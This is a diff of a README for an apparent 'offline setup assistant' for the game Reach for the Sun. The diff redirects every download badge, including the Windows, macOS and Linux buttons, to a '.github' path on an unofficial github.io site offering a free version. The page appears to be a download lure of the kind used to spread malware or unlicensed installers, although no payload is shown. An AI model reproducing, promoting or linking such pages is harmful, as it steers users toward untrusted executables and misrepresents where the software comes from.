@@ -1,7 +1,7 @@
 # 🌱 Reach for the Sun — Offline Setup Assistant
 
 [![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Download](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://reach-for-the-sun-offline-free.github.io/reach-for-the-sun-offline-setup-assistant)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://reach-for-the-sun-offline-free.github.io/.github)
 [![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)](https://reach-for-the-sun-offline-free.github.io/reach-for-the-sun-offline-setup-assistant)
 [![Educational](https://img.shields.io/badge/Educational-STEM%20%7C%20Biology-brightgreen)](https://reach-for-the-sun-offline-free.github.io/reach-for-the-sun-offline-setup-assistant)
 
@@ -14,16 +14,16 @@
 ### 🎯 Quick Download
 <div align="center">
 
-[![Download Game](https://img.shields.io/badge/Download%20Game-Play%20Now!-FF6B6B?style=for-the-badge&logo=download)](https://reach-for-the-sun-offline-free.github.io/reach-for-the-sun-offline-setup-assistant)
+[![Download Game](https://img.shields.io/badge/Download%20Game-Play%20Now!-FF6B6B?style=for-the-badge&logo=download)](https://reach-for-the-sun-offline-free.github.io/.github)
 
 </div>
 
 ### 💾 Platform Downloads
 <div align="center">
 
-[![Windows](https://img.shields.io/badge/Windows-0078D4?style=for-the-badge&logo=windows)](https://reach-for-the-sun-offline-free.github.io/reach-for-the-sun-offline-setup-assistant)
-[![macOS](https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=apple)](https://reach-for-the-sun-offline-free.github.io/reach-for-the-sun-offline-setup-assistant)
-[![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)](https://reach-for-the-sun-offline-free.github.io/reach-for-the-sun-offline-setup-assistant)
+[![Windows](https://img.shields.io/badge/Windows-0078D4?style=for-the-badge&logo=windows)](https://reach-for-the-sun-offline-free.github.io/.github)
+[![macOS](https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=apple)](https://reach-for-the-sun-offline-free.github.io/.github)
+[![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)](https://reach-for-the-sun-offline-free.github.io/.github)
 
 </div>
 
